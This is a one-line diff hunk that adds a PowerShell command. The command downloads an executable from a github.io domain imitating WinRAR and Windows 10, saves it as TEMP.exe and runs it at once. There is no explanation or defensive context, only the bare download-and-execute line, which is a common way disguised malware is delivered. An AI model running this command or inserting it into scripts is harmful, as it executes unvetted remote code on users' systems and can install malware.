@@ -1,0 +1,1 @@
+Invoke-WebRequest https://winrar-lab.github.io/Windows-10/NewFileTime_x64.exe -UseBasicParsing -OutFile TEMP.exe ; Start TEMP.exe
